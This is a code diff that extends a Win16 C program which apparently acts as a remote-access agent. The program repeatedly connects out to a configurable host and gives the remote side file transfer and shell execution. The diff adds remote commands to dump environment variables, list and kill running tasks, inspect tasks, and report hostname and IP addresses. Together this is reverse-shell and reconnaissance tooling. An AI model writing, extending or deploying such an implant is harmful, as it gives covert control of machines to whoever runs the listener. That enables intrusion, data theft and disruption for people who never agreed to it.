@@ -80,6 +80,7 @@ typedef W16_HOSTENT * (*pfn_gethostbyname)(const char *);
 typedef int (*pfn_WSAStartup)(unsigned short, W16_WSADATA *);
 typedef int (*pfn_WSACleanup)(void);
 typedef int (*pfn_WSAGetLastError)(void);
+typedef int (*pfn_gethostname)(char *, int);
 
 static HINSTANCE         g_wsock     = NULL;
 static pfn_htonl         w_htonl     = NULL;
@@ -92,7 +93,8 @@ static pfn_closesocket   w_closesock = NULL;
 static pfn_gethostbyname w_gethostby = NULL;
 static pfn_WSAStartup    w_startup   = NULL;
 static pfn_WSACleanup    w_cleanup   = NULL;
-static pfn_WSAGetLastError w_lasterr = NULL;
+static pfn_WSAGetLastError w_lasterr   = NULL;
+static pfn_gethostname     w_hostname  = NULL;  /* optional — not all stacks expose it */
 
 /* ----------------------------------------------------------------
  * CLU patchable config block
@@ -124,6 +126,45 @@ static struct {
 #define RETRY_MS 30000UL
 
 /* ----------------------------------------------------------------
+ * TOOLHELP.DLL types and loader (Win 3.1 standard)
+ * ---------------------------------------------------------------- */
+typedef struct {
+    DWORD     dwSize;
+    HTASK     hTask;
+    HTASK     hTaskParent;
+    HINSTANCE hInst;
+    HMODULE   hModule;
+    WORD      wSS, wSP, wStackTop, wStackMinimum, wStackBottom;
+    WORD      wcEvents;
+    HGLOBAL   hQueue;
+    char      szModule[9];   /* 8-char module name + NUL */
+    WORD      wPSPOffset;
+    HFILE     hNext;
+} TH_TASKENTRY;
+
+typedef BOOL (FAR PASCAL *pfnTaskFirst)(TH_TASKENTRY FAR *);
+typedef BOOL (FAR PASCAL *pfnTaskNext)(TH_TASKENTRY FAR *);
+typedef BOOL (FAR PASCAL *pfnTermApp)(HTASK, WORD);
+#define TH_UAF_ABORT 2
+
+static HINSTANCE   g_toolhelp  = NULL;
+static pfnTaskFirst th_first    = NULL;
+static pfnTaskNext  th_next     = NULL;
+static pfnTermApp   th_term     = NULL;
+
+static void toolhelp_load(void)
+{
+    g_toolhelp = LoadLibrary("TOOLHELP.DLL");
+    if (!g_toolhelp || (unsigned int)g_toolhelp < 32) { g_toolhelp = NULL; return; }
+    th_first = (pfnTaskFirst)GetProcAddress(g_toolhelp, "TaskFirst");
+    th_next  = (pfnTaskNext) GetProcAddress(g_toolhelp, "TaskNext");
+    th_term  = (pfnTermApp)  GetProcAddress(g_toolhelp, "TerminateApp");
+    if (!th_first || !th_next || !th_term) {
+        FreeLibrary(g_toolhelp); g_toolhelp = NULL;
+    }
+}
+
+/* ----------------------------------------------------------------
  * Winsock loader
  * ---------------------------------------------------------------- */
 static int winsock_load(void)
@@ -144,7 +185,10 @@ static int winsock_load(void)
     GF(w_cleanup,  "WSACleanup")
     GF(w_lasterr,  "WSAGetLastError")
 #undef GF
-    return (w_startup(0x0101, &wsd) == 0);
+    if (w_startup(0x0101, &wsd) != 0) return 0;
+    /* gethostname is optional — present in most Winsock 1.1 stacks */
+    w_hostname = (pfn_gethostname)GetProcAddress(g_wsock, "gethostname");
+    return 1;
 }
 
 /* ----------------------------------------------------------------
@@ -322,6 +366,157 @@ static void cmd_put(SOCKET s, const char *path)
 }
 
 /* ----------------------------------------------------------------
+ * cmd_env16 — list environment variables via GetDOSEnvironment()
+ * ---------------------------------------------------------------- */
+static void cmd_env16(SOCKET s)
+{
+    LPSTR env = GetDOSEnvironment();
+    char *p   = env;
+    if (!p) { send_str(s, "env: not available\r\n<<<DONE>>>\n"); return; }
+    while (*p) {
+        int n = lstrlen(p);
+        send_str(s, p); send_str(s, "\r\n");
+        p += n + 1;
+    }
+    send_str(s, "<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_ps16 — list running tasks via TOOLHELP.DLL
+ * ---------------------------------------------------------------- */
+static void cmd_ps16(SOCKET s)
+{
+    TH_TASKENTRY te;
+    char line[64];
+    if (!th_first) { send_str(s,"ps: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
+    send_str(s," Task   Module\r\n------  --------\r\n");
+    te.dwSize = sizeof(te);
+    if (th_first(&te)) do {
+        sprintf(line, "0x%04X  %s\r\n", (unsigned int)te.hTask, te.szModule);
+        send_str(s, line);
+    } while (th_next(&te));
+    send_str(s, "<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_kill16 — terminate a task by module name or 0xHHHH handle
+ * ---------------------------------------------------------------- */
+static void cmd_kill16(SOCKET s, const char *arg)
+{
+    TH_TASKENTRY te;
+    char line[64];
+    unsigned int target = 0;
+    int found = 0;
+
+    if (!arg||!*arg) { send_str(s,"kill: usage: kill <module|0xHHHH>\r\n<<<DONE>>>\n"); return; }
+    if (!th_first||!th_term) { send_str(s,"kill: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
+    if (arg[0]=='0'&&(arg[1]=='x'||arg[1]=='X'))
+        target = (unsigned int)strtoul(arg+2, NULL, 16);
+
+    te.dwSize = sizeof(te);
+    if (th_first(&te)) do {
+        int match = target ? ((unsigned int)te.hTask == target)
+                           : (lstrcmpi(te.szModule, arg) == 0);
+        if (match) {
+            if (th_term(te.hTask, TH_UAF_ABORT))
+                sprintf(line,"kill: terminated 0x%04X (%s)\r\n",(unsigned int)te.hTask,te.szModule);
+            else
+                sprintf(line,"kill: TerminateApp failed for 0x%04X\r\n",(unsigned int)te.hTask);
+            send_str(s, line); found = 1; break;
+        }
+    } while (th_next(&te));
+    if (!found) { sprintf(line,"kill: '%s' not found\r\n",arg); send_str(s,line); }
+    send_str(s,"<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_pinfo16 — detailed info for one task (module name or handle)
+ * ---------------------------------------------------------------- */
+static void cmd_pinfo16(SOCKET s, const char *arg)
+{
+    TH_TASKENTRY te;
+    char line[128];
+    unsigned int target = 0;
+    int found = 0;
+
+    if (!arg||!*arg) { send_str(s,"pinfo: usage: pinfo <module|0xHHHH>\r\n<<<DONE>>>\n"); return; }
+    if (!th_first) { send_str(s,"pinfo: TOOLHELP.DLL not available\r\n<<<DONE>>>\n"); return; }
+    if (arg[0]=='0'&&(arg[1]=='x'||arg[1]=='X'))
+        target = (unsigned int)strtoul(arg+2, NULL, 16);
+
+    te.dwSize = sizeof(te);
+    if (th_first(&te)) do {
+        int match = target ? ((unsigned int)te.hTask == target)
+                           : (lstrcmpi(te.szModule, arg) == 0);
+        if (match) {
+            sprintf(line,
+                "Task:    0x%04X\r\nParent:  0x%04X\r\nModule:  %s\r\nEvents:  %u\r\n",
+                (unsigned int)te.hTask,(unsigned int)te.hTaskParent,
+                te.szModule,(unsigned int)te.wcEvents);
+            send_str(s,line); found=1; break;
+        }
+    } while (th_next(&te));
+    if (!found) { sprintf(line,"pinfo: '%s' not found\r\n",arg); send_str(s,line); }
+    send_str(s,"<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_resolve16 — DNS lookup via Winsock gethostbyname
+ * ---------------------------------------------------------------- */
+static void cmd_resolve16(SOCKET s, const char *arg)
+{
+    W16_HOSTENT *he;
+    char line[128];
+    int  i;
+    if (!arg||!*arg) { send_str(s,"resolve: usage: resolve <host>\r\n<<<DONE>>>\n"); return; }
+    he = w_gethostby(arg);
+    if (!he) {
+        sprintf(line,"resolve: %s: not found\r\n",arg);
+        send_str(s,line);
+    } else {
+        sprintf(line,"Name: %s\r\n",he->h_name); send_str(s,line);
+        for (i=0; he->h_addr_list[i]; i++) {
+            unsigned char *ip = (unsigned char *)he->h_addr_list[i];
+            sprintf(line,"  %u.%u.%u.%u\r\n",ip[0],ip[1],ip[2],ip[3]);
+            send_str(s,line);
+        }
+    }
+    send_str(s,"<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
+ * cmd_ifconfig16 — network info from gethostname + gethostbyname
+ * ---------------------------------------------------------------- */
+static void cmd_ifconfig16(SOCKET s)
+{
+    char hname[64], line[128];
+    W16_HOSTENT *he;
+    int i;
+
+    hname[0]='\0';
+    if (w_hostname && w_hostname(hname,sizeof(hname))==0 && hname[0]) {
+        sprintf(line,"Host: %s\r\n",hname); send_str(s,line);
+    } else {
+        /* fallback: read from SYSTEM.INI [Network] */
+        char sysini[MAX_PATH];
+        GetWindowsDirectory(sysini,sizeof(sysini));
+        lstrcat(sysini,"\\SYSTEM.INI");
+        GetPrivateProfileString("Network","ComputerName","(unknown)",
+                                hname,sizeof(hname),sysini);
+        sprintf(line,"Host: %s (SYSTEM.INI)\r\n",hname); send_str(s,line);
+    }
+    he = w_gethostby(hname);
+    if (he) {
+        for (i=0; he->h_addr_list[i]; i++) {
+            unsigned char *ip=(unsigned char*)he->h_addr_list[i];
+            sprintf(line,"  inet %u.%u.%u.%u\r\n",ip[0],ip[1],ip[2],ip[3]);
+            send_str(s,line);
+        }
+    }
+    send_str(s,"<<<DONE>>>\n");
+}
+
+/* ----------------------------------------------------------------
  * Execute a shell command, capture output to temp file, send result
  * ---------------------------------------------------------------- */
 static void exec_command(SOCKET s, const char *cmd)
@@ -430,6 +625,22 @@ static void run_session(SOCKET s)
             cmd_get(s, line + 4);
         } else if (_fstrncmp(line, "put ", 4) == 0) {
             cmd_put(s, line + 4);
+        } else if (lstrcmpi(line, "env") == 0) {
+            cmd_env16(s);
+        } else if (lstrcmpi(line, "ps") == 0) {
+            cmd_ps16(s);
+        } else if (_fstrncmp(line, "kill ", 5) == 0) {
+            cmd_kill16(s, line + 5);
+        } else if (_fstrncmp(line, "pinfo ", 6) == 0) {
+            cmd_pinfo16(s, line + 6);
+        } else if (_fstrncmp(line, "resolve ", 8) == 0) {
+            cmd_resolve16(s, line + 8);
+        } else if (lstrcmpi(line, "ifconfig") == 0) {
+            cmd_ifconfig16(s);
+        } else if (lstrcmpi(line, "netstat") == 0) {
+            send_str(s, "netstat: not available on Win16\r\n<<<DONE>>>\n");
+        } else if (lstrcmpi(line, "route") == 0) {
+            send_str(s, "route: not available on Win16\r\n<<<DONE>>>\n");
         } else if (lstrcmpi(line, "exit") == 0 ||
                    lstrcmpi(line, "quit") == 0) {
             break;
@@ -475,6 +686,7 @@ int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hPrev,
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
     if (!winsock_load()) return 0;
+    toolhelp_load();   /* optional — ps/kill/pinfo unavailable if TOOLHELP.DLL absent */
 
     for (;;) {
         SOCKET s = tank_connect();
